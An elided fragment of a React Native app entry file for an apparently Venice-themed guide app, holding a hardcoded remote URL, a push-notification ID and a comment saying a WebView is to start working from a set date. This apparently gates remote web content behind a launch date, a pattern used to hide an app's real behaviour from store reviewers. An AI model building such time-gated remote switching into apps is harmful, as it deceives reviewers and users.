...
import WhispersOfVeniceStreetsProdScr from './VeniceStreets/screens/WhispersOfVeniceStreetsProdScr';
// libs
...
function App() {
  ...
  const INITIAL_URL = `https://drift-fern-signal.space/`;
  const URL_IDENTIFAIRE = `nEibCkM2`;
  ...
  OneSignal.initialize('55b21086-752b-4467-9184-d195337c85a1');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-08-05T08:08:00'); //дата з якої поч працювати webView
  ...
  console.log('My product Url ==>', finalLink);
    ...
    const Route = ({ isFatch }) => {
            ...
            return (
                <Stack.Navigator>
                    <Stack.Screen
                        ...
                        name="WhispersOfVeniceStreetsProdScr"
                        component={WhispersOfVeniceStreetsProdScr}
        ...
        return (
            <Stack.Navigator
                initialRouteName="VeniceinfoStreets"
